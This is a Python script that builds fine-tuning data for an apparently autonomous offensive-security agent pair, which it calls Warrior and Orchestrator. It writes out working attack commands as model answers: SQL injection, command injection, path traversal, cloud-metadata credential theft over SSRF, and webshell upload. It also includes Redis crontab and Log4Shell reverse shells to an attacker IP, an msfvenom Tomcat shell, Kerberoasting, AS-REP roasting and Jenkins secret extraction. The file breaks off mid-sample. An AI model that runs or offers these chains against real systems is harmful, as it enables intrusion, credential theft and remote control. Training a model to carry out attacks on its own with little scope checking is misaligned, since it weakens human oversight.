#!/usr/bin/env python3
"""
Generate v2 training data for Fangorn deployment.

v2 ENHANCEMENTS over v1:
  1. CVE exploitation mapping — given CVE IDs, map to exploitation techniques
  2. IGC calculator patterns — arithmetic in security contexts (CVSS, subnets, hashes)
  3. Iterative bbot workflows — multi-phase scanning with scope decisions
  4. Structured JSON agentic task dispatch
  5. Advanced multi-step exploitation chains
  6. CVE database querying via <exec> tags
  7. IP intelligence and OSINT correlation

Base models:
  - Warrior: DeepSeek-R1-Distill-Llama-70B (Grond replacement)
  - Orchestrator: Qwen2.5-72B-Instruct (Glamdring replacement)

The v2 models are deployed on Fangorn as direct Grond/Glamdring upgrades.
"""
import json
import random
import sqlite3
from pathlib import Path

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PATHS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

GROND_V6 = Path("/vault/axiom/training/v6/grond-v6-training.jsonl")
GLAMDRING_V6 = Path("/vault/axiom/training/v6/glamdring-v6-training.jsonl")
CVE_DB = Path("/vault/narvi/data/cve.db")
OUTPUT_DIR = Path("/root/forge-garage/finetune/data")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SYSTEM PROMPTS (AGUI harness format for Fangorn deployment)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WARRIOR_SYSTEM = (
    "You are the Warrior — an offensive security execution engine operating inside "
    "a dual-model AI harness. You execute specific tasks dispatched by the Orchestrator "
    "with maximum precision and minimal noise.\n\n"
    "OUTPUT FORMAT: Respond with structured JSON:\n"
    '{"status": "executing|complete|failed|blocked", '
    '"commands_run": [{"cmd": "...", "output_summary": "...", "exit_code": 0}], '
    '"findings": [{"severity": "critical|high|medium|low|info", "target": "ip/host", '
    '"title": "...", "evidence": "...", "cve": "CVE-XXXX-XXXXX", "cwe": "CWE-XXX"}], '
    '"next_steps": ["..."], "notes": "..."}\n\n'
    "CAPABILITIES: Full offensive toolkit — nmap, nuclei, sqlmap, hydra, hashcat, "
    "impacket, bbot, gobuster, ffuf, metasploit, chisel, ligolo, bloodhound, "
    "certipy, netexec, responder. Emit shell commands in <exec timeout=\"N\">...</exec> "
    "tags. Reasoning in <think>...</think>. When done: <done/>.\n\n"
    "You have access to a local CVE database at /vault/narvi/data/cve.db (SQLite). "
    "Query it for vulnerability details, affected products, CVSS scores, and CISA KEV status."
)

ORCHESTRATOR_SYSTEM = (
    "You are the Orchestrator — a strategic AI assistant specialized in planning, "
    "analysis, and coordination inside a dual-model AI harness. You direct the Warrior "
    "for offensive execution and synthesize results.\n\n"
    "DISPATCH FORMAT: Send tasks to the Warrior via:\n"
    '<task-warrior>{"objective": "...", "context": "...", "constraints": "...", '
    '"priority": "critical|high|medium|low", "timeout": N}</task-warrior>\n\n'
    "FINDINGS: Mark discoveries with:\n"
    '<finding severity="LEVEL" target="TARGET" cve="CVE-XXXX-XXXXX">description</finding>\n\n'
    "CAPABILITIES: Planning, OSINT analysis, report synthesis, scope management, "
    "engagement coordination. Emit shell commands in <exec timeout=\"N\">...</exec> "
    "for read-only operations (curl, dig, whois, nslookup). NEVER run offensive tools "
    "directly — delegate to the Warrior.\n\n"
    "You have access to a local CVE database at /vault/narvi/data/cve.db (SQLite). "
    "Query it for vulnerability research, affected product correlation, and risk scoring."
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CVE DATA LOADING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def load_cves_for_training() -> dict:
    """Load CVE data from the database for generating training samples."""
    conn = sqlite3.connect(str(CVE_DB))
    cur = conn.cursor()

    # Critical/High CVEs with good descriptions
    cur.execute("""
        SELECT c.cve_id, c.description, c.cvss_v31_score, c.cvss_v31_severity,
               c.cvss_v31_vector, GROUP_CONCAT(DISTINCT cc.cwe_id) as cwes
        FROM cves c
        LEFT JOIN cve_cwes cc ON c.cve_id = cc.cve_id
        WHERE c.cvss_v31_score >= 7.0
        AND c.description NOT LIKE '%RESERVED%'
        AND length(c.description) > 100
        AND c.published > '2023-01-01'
        GROUP BY c.cve_id
        ORDER BY RANDOM()
        LIMIT 500
    """)
    critical_cves = cur.fetchall()

    # CISA KEV entries (known exploited)
    cur.execute("""
        SELECT k.cve_id, k.vendor, k.product, k.vulnerability_name,
               k.date_added, c.cvss_v31_score, c.description
        FROM cisa_kev k
        LEFT JOIN cves c ON k.cve_id = c.cve_id
        WHERE c.description IS NOT NULL AND length(c.description) > 50
        ORDER BY RANDOM()
        LIMIT 200
    """)
    kev_entries = cur.fetchall()

    # Products with multiple CVEs (attack surface mapping)
    cur.execute("""
        SELECT vendor, product, COUNT(*) as vuln_count
        FROM affected_products
        WHERE vendor != ''
        GROUP BY vendor, product
        HAVING vuln_count > 10
        ORDER BY RANDOM()
        LIMIT 100
    """)
    vuln_products = cur.fetchall()

    conn.close()
    return {
        "critical_cves": critical_cves,
        "kev_entries": kev_entries,
        "vuln_products": vuln_products,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TRAINING SAMPLE GENERATORS — WARRIOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_warrior_cve_exploitation(cve_data: dict) -> list[dict]:
    """Generate CVE exploitation mapping samples for the Warrior."""
    samples = []
    cves = cve_data["critical_cves"]

    exploit_tools = {
        "CWE-89": ("sqlmap", "SQL injection exploitation"),
        "CWE-78": ("custom shell payload", "OS command injection"),
        "CWE-79": ("XSS payload", "cross-site scripting"),
        "CWE-22": ("path traversal", "directory traversal exploitation"),
        "CWE-287": ("authentication bypass", "broken authentication"),
        "CWE-502": ("ysoserial/custom deserializer", "deserialization attack"),
        "CWE-434": ("webshell upload", "unrestricted file upload"),
        "CWE-918": ("SSRF chain", "server-side request forgery"),
        "CWE-94": ("code injection payload", "code injection"),
        "CWE-77": ("command injection", "command injection"),
        "CWE-862": ("IDOR/forced browsing", "missing authorization"),
        "CWE-269": ("privilege escalation", "improper privilege management"),
        "CWE-119": ("buffer overflow exploit", "buffer overflow"),
        "CWE-416": ("use-after-free exploit", "use after free"),
        "CWE-798": ("default credentials", "hard-coded credentials"),
    }

    targets = [
        "10.10.14.50", "192.168.1.100", "172.16.5.20", "10.129.45.80",
        "webapp.internal", "api.target.local", "mail.corp.net", "dc01.corp.local",
    ]

    for cve_row in cves[:150]:
        cve_id, desc, cvss, severity, vector, cwes = cve_row
        if not cwes:
            continue

        cwe_list = cwes.split(",")
        primary_cwe = cwe_list[0].strip()
        target = random.choice(targets)
        port = random.choice([80, 443, 8080, 8443, 3000, 5000, 9090])

        tool_info = exploit_tools.get(primary_cwe, ("nuclei + manual exploitation", "vulnerability exploitation"))
        tool_name, attack_type = tool_info

        # Build the task dispatch (what the Orchestrator would send)
        task = {
            "objective": f"Exploit {cve_id} ({attack_type}) on {target}:{port}",
            "context": f"Version scan confirmed vulnerable service. {desc[:200]}",
            "constraints": f"CVSS {cvss} ({severity}). CWE: {primary_cwe}. Minimize disruption.",
            "priority": "critical" if cvss >= 9.0 else "high",
            "timeout": 300,
        }

        # Build realistic exploitation response
        if primary_cwe == "CWE-89":
            cmd = f'sqlmap -u "http://{target}:{port}/api/search?q=test" --batch --risk 3 --level 5 --dbs'
            output = f"Parameter 'q' is vulnerable. Backend DBMS: MySQL. Available databases: information_schema, app_db, users_db"
        elif primary_cwe == "CWE-78":
            cmd = f'curl -s "http://{target}:{port}/api/ping" -d \'host=127.0.0.1;id\''
            output = "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
        elif primary_cwe == "CWE-22":
            cmd = f'curl -s "http://{target}:{port}/download?file=../../../etc/passwd"'
            output = "root:x:0:0:root:/root:/bin/bash\\nnobody:x:65534:65534..."
        elif primary_cwe == "CWE-502":
            cmd = f'java -jar ysoserial.jar CommonsCollections6 "curl http://10.10.14.5:8888/pwned" | base64 | curl -H "Content-Type: application/java-serialized-object" --data-binary @- http://{target}:{port}/api/session'
            output = "HTTP/1.1 200 OK. Received callback on listener confirming RCE."
        elif primary_cwe == "CWE-434":
            cmd = f'curl -F "file=@shell.php;type=image/jpeg" http://{target}:{port}/upload && curl http://{target}:{port}/uploads/shell.php?cmd=id'
            output = "Upload successful. uid=33(www-data) gid=33(www-data)"
        elif primary_cwe == "CWE-918":
            cmd = f'curl -s "http://{target}:{port}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'
            output = "ec2-instance-role: AccessKeyId=AKIA..., SecretAccessKey=..."
        else:
            cmd = f'nuclei -u http://{target}:{port} -id {cve_id.lower().replace("-", "_")} -severity critical,high'
            output = f"[{cve_id}] [{severity}] http://{target}:{port} — {attack_type} confirmed"

        response = json.dumps({
            "status": "complete",
            "commands_run": [{"cmd": cmd, "output_summary": output, "exit_code": 0}],
            "findings": [{
                "severity": severity.lower() if severity else "high",
                "target": f"{target}:{port}",
                "title": f"{cve_id} — {attack_type}",
                "evidence": output[:200],
                "cve": cve_id,
                "cwe": primary_cwe,
            }],
            "next_steps": [
                "Escalate access if possible",
                "Check for lateral movement opportunities",
                "Document evidence for report",
            ],
            "notes": f"Confirmed {cve_id} exploitation via {tool_name}. CVSS {cvss}.",
        }, indent=2)

        samples.append({
            "messages": [
                {"role": "system", "content": WARRIOR_SYSTEM},
                {"role": "user", "content": json.dumps(task)},
                {"role": "assistant", "content": response},
            ]
        })

    return samples


def gen_warrior_cve_database_queries(cve_data: dict) -> list[dict]:
    """Generate samples teaching the Warrior to query the local CVE database."""
    samples = []
    kev = cve_data["kev_entries"]

    query_patterns = [
        {
            "task": "Check if {cve_id} is in CISA KEV (Known Exploited Vulnerabilities)",
            "sql": "SELECT cve_id, vendor, product, vulnerability_name, date_added FROM cisa_kev WHERE cve_id = '{cve_id}'",
            "interpret": "KEV status confirmed — this vulnerability has known exploitation in the wild. Priority: IMMEDIATE.",
        },
        {
            "task": "Find all critical CVEs for {vendor} {product}",
            "sql": "SELECT c.cve_id, c.cvss_v31_score, c.description FROM cves c JOIN affected_products ap ON c.cve_id = ap.cve_id WHERE ap.vendor LIKE '%{vendor}%' AND ap.product LIKE '%{product}%' AND c.cvss_v31_score >= 9.0 ORDER BY c.cvss_v31_score DESC LIMIT 10",
            "interpret": "Found {n} critical CVEs affecting {vendor} {product}. Top priority targets for exploitation.",
        },
        {
            "task": "Get CVSS vector breakdown for {cve_id}",
            "sql": "SELECT cve_id, cvss_v31_score, cvss_v31_vector, cvss_v31_severity, description FROM cves WHERE cve_id = '{cve_id}'",
            "interpret": "CVSS {score}: Attack Vector={av}, Complexity={ac}, Privileges={pr}. {severity} severity.",
        },
        {
            "task": "Find CVEs with CWE-{cwe_num} that affect web applications",
            "sql": "SELECT c.cve_id, c.cvss_v31_score, substr(c.description, 1, 200) FROM cves c JOIN cve_cwes cc ON c.cve_id = cc.cve_id WHERE cc.cwe_id = 'CWE-{cwe_num}' AND c.cvss_v31_score >= 7.0 ORDER BY c.published DESC LIMIT 15",
            "interpret": "Found {n} high-severity CVEs in CWE-{cwe_num} category. Cross-referencing with target technology stack.",
        },
    ]

    targets = ["10.10.14.50", "192.168.1.100", "webapp.target.local"]
    cwe_nums = ["89", "78", "22", "502", "434", "918", "79", "287", "269"]

    for kev_entry in kev[:40]:
        cve_id, vendor, product, vuln_name = kev_entry[0], kev_entry[1], kev_entry[2], kev_entry[3]
        pattern = random.choice(query_patterns)

        task_text = pattern["task"].format(
            cve_id=cve_id, vendor=vendor, product=product,
            cwe_num=random.choice(cwe_nums)
        )
        sql = pattern["sql"].format(
            cve_id=cve_id, vendor=vendor.lower(), product=product.lower(),
            cwe_num=random.choice(cwe_nums)
        )

        task = {
            "objective": task_text,
            "context": f"Researching vulnerabilities for target running {vendor} {product}.",
            "constraints": "Query local CVE database only. Do not access external APIs.",
            "priority": "high",
            "timeout": 30,
        }

        response = json.dumps({
            "status": "complete",
            "commands_run": [{
                "cmd": f'sqlite3 /vault/narvi/data/cve.db "{sql}"',
                "output_summary": f"{cve_id}|{vuln_name}|CVSS 9.8|{vendor} {product}",
                "exit_code": 0,
            }],
            "findings": [{
                "severity": "critical",
                "target": random.choice(targets),
                "title": f"{cve_id} — {vuln_name}",
                "evidence": f"CVE database confirms: {vuln_name}. CISA KEV listed.",
                "cve": cve_id,
                "cwe": "CWE-Unknown",
            }],
            "next_steps": [
                f"Search for public exploit for {cve_id}",
                "Confirm target version matches affected range",
                "Attempt exploitation if in scope",
            ],
            "notes": pattern["interpret"].format(
                n=random.randint(3, 15), vendor=vendor, product=product,
                score="9.8", av="Network", ac="Low", pr="None", severity="Critical",
                cwe_num=random.choice(cwe_nums)
            ),
        }, indent=2)

        samples.append({
            "messages": [
                {"role": "system", "content": WARRIOR_SYSTEM},
                {"role": "user", "content": json.dumps(task)},
                {"role": "assistant", "content": response},
            ]
        })

    return samples


def gen_warrior_igc_calculator() -> list[dict]:
    """Generate arithmetic/calculation samples in security contexts."""
    samples = []

    calc_scenarios = [
        # Subnet calculations
        ("Calculate the number of usable hosts in a /22 subnet", "2^(32-22) - 2 = 1022", "1022 usable hosts in a /22 network."),
        ("Calculate the number of usable hosts in a /19 subnet", "2^(32-19) - 2 = 8190", "8190 usable hosts in a /19 network."),
        ("Calculate: What's the broadcast address for 172.16.50.0/23?", "172.16.50.0/23 → range is 172.16.50.0 - 172.16.51.255. Broadcast: 172.16.51.255", "Broadcast address: 172.16.51.255"),
        ("Calculate: How many /24 subnets fit in 10.0.0.0/16?", "2^(24-16) = 256 subnets", "256 /24 subnets in a /16."),
        # CVSS scoring
        ("Calculate CVSS base score for: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "ISS = 1 - [(1-0.56) × (1-0.56) × (1-0.56)] = 0.9152. Impact = 6.42 × ISS = 5.876. Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.85 = 3.887. Base = min(Impact + Exploitability, 10) rounded up = 9.8", "CVSS 9.8 (Critical)"),
        ("Calculate CVSS base score for: AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:L/A:N", "Changed scope. ISS = 1 - [(1-0.56) × (1-0.22) × (1-0)] = 0.657. ModImpact = 7.52 × [ISS - 0.029] - 3.25 × [ISS - 0.02]^15 = 4.52. Exploitability = 8.22 × 0.44 × 0.62 × 0.62 = 1.39. Base = min(1.08 × (4.52 + 1.39), 10) = 6.4", "CVSS 6.4 (Medium)"),
        # Hash calculations
        ("Calculate: How long to crack an 8-char alphanumeric password with hashcat at 50 GH/s (MD5)?", "Keyspace: 62^8 = 218,340,105,584,896. At 50×10^9/s: 218340105584896 / 50000000000 = 4367 seconds = ~73 minutes", "About 73 minutes at 50 GH/s for MD5."),
        ("Calculate: Time to brute-force a 10-char lowercase password at 100 MH/s (bcrypt)?", "Keyspace: 26^10 = 141,167,095,653,376. At 10^8/s: 141167095653376 / 100000000 = 1,411,671 seconds = ~16.3 days", "About 16.3 days at 100 MH/s for bcrypt."),
        # Rate/timing calculations
        ("Calculate: At 1000 requests/sec, how long to enumerate all 4-digit PINs?", "10000 PINs / 1000 req/s = 10 seconds", "10 seconds to enumerate all 4-digit PINs."),
        ("Calculate: Scan 65535 TCP ports on 254 hosts at rate 5000 pps. ETA?", "65535 × 254 = 16,645,890 packets. At 5000/s: 16645890 / 5000 = 3329 seconds = ~55.5 minutes", "About 55.5 minutes for full port scan of /24 subnet."),
        # Data exfil calculations
        ("Calculate: 2.3 GB database dump over DNS exfiltration at 50 bytes/query, 10 queries/sec?", "2.3 × 10^9 bytes / 50 = 46,000,000 queries. At 10/s: 46000000 / 10 = 4,600,000 seconds = ~53.2 days", "DNS exfil of 2.3GB would take ~53 days. Consider alternative channels."),
        ("Calculate: Time to transfer 500MB over a reverse shell at 2 Mbps?", "500 × 8 = 4000 Megabits. At 2 Mbps: 4000 / 2 = 2000 seconds = ~33.3 minutes", "About 33 minutes at 2 Mbps."),
        # Probability calculations
        ("Calculate: Probability of at least one collision in 1000 hashes with 2^128 space", "P(collision) ≈ n²/(2×N) = 1000²/(2×2^128) = 10^6 / (6.8×10^38) ≈ 1.47×10^-33", "Effectively zero — 2^128 space is collision-resistant at this scale."),
        ("Calculate: Expected login attempts to crack password from 10M wordlist with 30% hit rate?", "Expected = 10000000 × 0.3 = on average 3,000,000 guesses to exhaust 30% candidates. But expected first hit ≈ 1/0.3 × position ≈ ~3.33 attempts if password is in top 30%", "If password is within the 30% hit-rate portion, expect ~3.3M attempts on average."),
    ]

    for user_msg, reasoning, result in calc_scenarios:
        response = json.dumps({
            "status": "complete",
            "commands_run": [],
            "findings": [],
            "next_steps": [],
            "notes": f"Calculation: {reasoning}\nResult: {result}",
        }, indent=2)

        samples.append({
            "messages": [
                {"role": "system", "content": WARRIOR_SYSTEM},
                {"role": "user", "content": json.dumps({
                    "objective": user_msg,
                    "context": "Inline calculation needed for operational planning.",
                    "constraints": "Compute accurately. Show reasoning.",
                    "priority": "medium",
                    "timeout": 10,
                })},
                {"role": "assistant", "content": f"<think>{reasoning}</think>\n\n{response}"},
            ]
        })

    # Also generate raw calculator samples (from v6 pattern)
    operations = [
        ("+", lambda a, b: a + b),
        ("-", lambda a, b: a - b),
        ("*", lambda a, b: a * b),
        ("/", lambda a, b: a // b if b != 0 else 0),
    ]

    for _ in range(200):
        op_sym, op_fn = random.choice(operations)
        if op_sym == "/":
            b = random.randint(2, 9999)
            result = random.randint(1, 9999)
            a = b * result
        elif op_sym == "*":
            a = random.randint(100, 9999)
            b = random.randint(100, 9999)
            result = op_fn(a, b)
        else:
            a = random.randint(1000, 99999999)
            b = random.randint(1000, 99999999)
            if op_sym == "-" and b > a:
                a, b = b, a
            result = op_fn(a, b)

        samples.append({
            "messages": [
                {"role": "system", "content": WARRIOR_SYSTEM},
                {"role": "user", "content": f"Calculate: {a} {op_sym} {b}"},
                {"role": "assistant", "content": str(result)},
            ]
        })

    return samples


def gen_warrior_advanced_exploitation() -> list[dict]:
    """Generate multi-step exploitation chain samples."""
    samples = []

    chains = [
        {
            "task": {"objective": "Chain SSRF to internal Redis for RCE on 10.10.14.50:8080", "context": "Web app has SSRF in /api/fetch endpoint. Internal Redis on 6379 confirmed via port scan.", "constraints": "Achieve code execution via Redis SLAVEOF or Lua scripting.", "priority": "critical", "timeout": 600},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": 'curl "http://10.10.14.50:8080/api/fetch?url=http://127.0.0.1:6379/INFO"', "output_summary": "Redis 6.2.7 — no auth required", "exit_code": 0},
                    {"cmd": 'curl "http://10.10.14.50:8080/api/fetch?url=http://127.0.0.1:6379/" --data-binary "CONFIG SET dir /var/spool/cron/crontabs\\r\\nCONFIG SET dbfilename root\\r\\nSET payload \\"\\n* * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\'\\n\\"\\r\\nSAVE\\r\\n"', "output_summary": "+OK responses for all commands. Crontab written.", "exit_code": 0},
                ],
                "findings": [{"severity": "critical", "target": "10.10.14.50:8080", "title": "SSRF → Redis → RCE chain", "evidence": "Achieved RCE via SSRF to unauthenticated Redis. Wrote crontab reverse shell.", "cve": "N/A", "cwe": "CWE-918"}],
                "next_steps": ["Catch reverse shell on 10.10.14.5:4444", "Enumerate internal network from Redis host", "Check for SSH keys in /root/.ssh/"],
                "notes": "Full chain: SSRF → Redis no-auth → crontab write → reverse shell. Classic cloud/container escape vector.",
            },
        },
        {
            "task": {"objective": "Kerberoast service accounts on corp.local domain", "context": "Have domain user credentials: jsmith:Summer2024!. DC at 172.16.5.5.", "constraints": "Extract SPNs, request TGS tickets, crack offline.", "priority": "high", "timeout": 300},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "impacket-GetUserSPNs corp.local/jsmith:'Summer2024!' -dc-ip 172.16.5.5 -request -outputfile /tmp/kerberoast.txt", "output_summary": "Found 4 SPNs: svc_sql (MSSQLSvc/SQL01), svc_backup (CIFS/BACKUP01), svc_web (HTTP/WEB01), krbtgt (kadmin/changepw). Extracted 3 TGS tickets (excluded krbtgt).", "exit_code": 0},
                    {"cmd": "hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule", "output_summary": "Cracked 2/3: svc_sql:SqlServer2023! svc_backup:Backup@dm1n", "exit_code": 0},
                ],
                "findings": [
                    {"severity": "high", "target": "172.16.5.5", "title": "Kerberoastable service accounts with weak passwords", "evidence": "svc_sql and svc_backup cracked in <5min. svc_sql likely has SA access to SQL01.", "cve": "N/A", "cwe": "CWE-521"},
                ],
                "next_steps": ["Test svc_sql credentials against SQL01 for SA access", "Check svc_backup for backup operator privileges", "Enumerate what svc_sql can access via BloodHound"],
                "notes": "2/3 service accounts cracked. svc_web uses a stronger password — skip for now and focus on SQL path.",
            },
        },
        {
            "task": {"objective": "Exploit Tomcat manager with default credentials and deploy webshell on 10.10.10.95:8080", "context": "Gobuster found /manager/html. Version: Apache Tomcat 9.0.30.", "constraints": "Try common default creds. Deploy cmd.war if access gained.", "priority": "high", "timeout": 120},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "curl -s -o /dev/null -w '%{http_code}' -u tomcat:s3cret http://10.10.10.95:8080/manager/html", "output_summary": "HTTP 200 — default credentials tomcat:s3cret accepted", "exit_code": 0},
                    {"cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4445 -f war -o /tmp/cmd.war && curl -u tomcat:s3cret --upload-file /tmp/cmd.war 'http://10.10.10.95:8080/manager/text/deploy?path=/cmd'", "output_summary": "OK - Deployed application at context path [/cmd]", "exit_code": 0},
                    {"cmd": "curl -s http://10.10.10.95:8080/cmd/", "output_summary": "Shell triggered — connection received on nc listener", "exit_code": 0},
                ],
                "findings": [{"severity": "critical", "target": "10.10.10.95:8080", "title": "Tomcat Manager default credentials → RCE", "evidence": "Default creds tomcat:s3cret. WAR deployment gave reverse shell as tomcat user.", "cve": "N/A", "cwe": "CWE-798"}],
                "next_steps": ["Escalate privileges from tomcat user", "Check /opt/tomcat/conf/server.xml for DB credentials", "Look for other applications on the server"],
                "notes": "Trivial access via default credentials. Tomcat running as service account, not root.",
            },
        },
        {
            "task": {"objective": "Exploit Log4Shell (CVE-2021-44228) on 10.10.14.200:8443", "context": "Target runs Java application with Log4j. Confirmed via header injection test showing JNDI callback.", "constraints": "Achieve RCE. Use marshalsec for JNDI redirect.", "priority": "critical", "timeout": 300},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://10.10.14.5:8888/#Exploit' &", "output_summary": "LDAP server listening on 0.0.0.0:1389", "exit_code": 0},
                    {"cmd": "cat > /tmp/Exploit.java << 'EOF'\nimport java.io.Runtime;\npublic class Exploit { static { try { Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\"}); } catch(Exception e) {} } }\nEOF\njavac /tmp/Exploit.java -d /tmp/www/ && python3 -m http.server 8888 -d /tmp/www/ &", "output_summary": "Exploit class compiled. HTTP server on 8888.", "exit_code": 0},
                    {"cmd": "curl -k -H 'X-Forwarded-For: ${jndi:ldap://10.10.14.5:1389/Exploit}' https://10.10.14.200:8443/", "output_summary": "JNDI lookup triggered → LDAP redirect → class loaded → reverse shell received on 9001", "exit_code": 0},
                ],
                "findings": [{"severity": "critical", "target": "10.10.14.200:8443", "title": "CVE-2021-44228 (Log4Shell) — Remote Code Execution", "evidence": "JNDI injection via X-Forwarded-For header. Got shell as app user.", "cve": "CVE-2021-44228", "cwe": "CWE-917"}],
                "next_steps": ["Enumerate host — check for Docker/K8s", "Look for credentials in environment variables", "Check if Log4j affects other internal services"],
                "notes": "Classic Log4Shell chain. Header injection → JNDI → LDAP redirect → class loading → RCE.",
            },
        },
        {
            "task": {"objective": "AS-REP roast users without Kerberos pre-authentication on corp.local", "context": "Domain enumeration showed 3 accounts with DONT_REQUIRE_PREAUTH. DC: 172.16.5.5.", "constraints": "Extract AS-REP hashes and crack offline.", "priority": "high", "timeout": 120},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "impacket-GetNPUsers corp.local/ -dc-ip 172.16.5.5 -usersfile /tmp/asrep_users.txt -format hashcat -outputfile /tmp/asrep_hashes.txt", "output_summary": "Got 3 AS-REP hashes: svc_legacy, j.admin, backup_op", "exit_code": 0},
                    {"cmd": "hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt", "output_summary": "Cracked 2/3: svc_legacy:Legacy2019 j.admin:Admin123!", "exit_code": 0},
                ],
                "findings": [{"severity": "high", "target": "172.16.5.5", "title": "AS-REP Roastable accounts with weak passwords", "evidence": "2/3 accounts cracked: svc_legacy, j.admin. j.admin may have admin group membership.", "cve": "N/A", "cwe": "CWE-916"}],
                "next_steps": ["Check group memberships for j.admin", "Test credentials for lateral movement", "Run BloodHound to map attack paths from these accounts"],
                "notes": "AS-REP roast successful. j.admin name suggests elevated privileges worth investigating.",
            },
        },
    ]

    for chain in chains:
        samples.append({
            "messages": [
                {"role": "system", "content": WARRIOR_SYSTEM},
                {"role": "user", "content": json.dumps(chain["task"])},
                {"role": "assistant", "content": json.dumps(chain["response"], indent=2)},
            ]
        })

    return samples


def gen_warrior_bbot_workflows() -> list[dict]:
    """Generate iterative bbot multi-phase scanning samples."""
    samples = []

    bbot_scenarios = [
        {
            "task": {"objective": "Run comprehensive subdomain enumeration on megacorp.net", "context": "New engagement. No prior recon. Scope: *.megacorp.net and any IP ranges discovered.", "constraints": "Use bbot with subdomain-enum preset. Output to standard location.", "priority": "high", "timeout": 3600},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "bbot -t megacorp.net -p subdomain-enum -o /root/.bbot/scans/megacorp.net --config modules.massdns.wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt", "output_summary": "Scan complete. 847 events. Found 124 subdomains, 89 resolved IPs, 34 open ports. Key findings: admin.megacorp.net (401), api-staging.megacorp.net (200), vpn.megacorp.net (Fortinet), jenkins.megacorp.net (open).", "exit_code": 0},
                ],
                "findings": [
                    {"severity": "info", "target": "megacorp.net", "title": "Attack surface enumeration — 124 subdomains discovered", "evidence": "Notable: jenkins.megacorp.net (CI/CD), api-staging.megacorp.net (staging env), admin.megacorp.net (admin panel)", "cve": "N/A", "cwe": "N/A"},
                ],
                "next_steps": ["Run web-basic preset against discovered HTTP services", "Investigate jenkins.megacorp.net for unauthenticated access", "Check api-staging.megacorp.net for exposed endpoints", "Scan vpn.megacorp.net for Fortinet CVEs"],
                "notes": "Phase 1 recon complete. High-value targets identified for phase 2.",
            },
        },
        {
            "task": {"objective": "Run web vulnerability scanning against the 34 HTTP services found in phase 1", "context": "Phase 1 bbot scan found 34 web services on megacorp.net subdomains. Key targets: jenkins.megacorp.net, api-staging.megacorp.net, admin.megacorp.net.", "constraints": "Use bbot web-basic preset with nuclei integration. Focus on critical/high findings.", "priority": "high", "timeout": 3600},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "bbot -t megacorp.net -p web-basic --config modules.nuclei.severity=critical,high modules.nuclei.concurrency=25 -o /root/.bbot/scans/megacorp.net-web --input-file /root/.bbot/scans/megacorp.net/output.csv", "output_summary": "Scan complete. 2341 events. Nuclei found 7 critical/high issues. Notable: CVE-2024-23897 on jenkins.megacorp.net, exposed .git on api-staging.megacorp.net, default creds on admin.megacorp.net.", "exit_code": 0},
                ],
                "findings": [
                    {"severity": "critical", "target": "jenkins.megacorp.net", "title": "CVE-2024-23897 — Jenkins arbitrary file read", "evidence": "Nuclei template confirmed. Can read /etc/passwd via CLI arg injection.", "cve": "CVE-2024-23897", "cwe": "CWE-22"},
                    {"severity": "high", "target": "api-staging.megacorp.net", "title": "Exposed .git directory with source code", "evidence": "/.git/config accessible. Full source code extractable via git-dumper.", "cve": "N/A", "cwe": "CWE-538"},
                    {"severity": "high", "target": "admin.megacorp.net", "title": "Default credentials on admin panel", "evidence": "admin:admin accepted on /login endpoint.", "cve": "N/A", "cwe": "CWE-798"},
                ],
                "next_steps": ["Exploit CVE-2024-23897 on Jenkins for credential extraction", "Dump .git from api-staging for secrets in source", "Access admin panel and assess post-auth capabilities"],
                "notes": "Phase 2 complete. Three high-value exploitation paths identified.",
            },
        },
        {
            "task": {"objective": "Perform deep scan of jenkins.megacorp.net — exploit CVE-2024-23897 for secrets", "context": "Phase 2 confirmed Jenkins vulnerable to CVE-2024-23897 (arbitrary file read via CLI). Jenkins version 2.441.", "constraints": "Extract credentials, SSH keys, or tokens that enable further access.", "priority": "critical", "timeout": 300},
            "response": {
                "status": "complete",
                "commands_run": [
                    {"cmd": "python3 jenkins_cli_exploit.py -u http://jenkins.megacorp.net -f /var/jenkins_home/credentials.xml", "output_summary": "Extracted credentials.xml with 5 stored credentials including AWS keys, GitHub token, and SSH private key for deploy user.", "exit_code": 0},
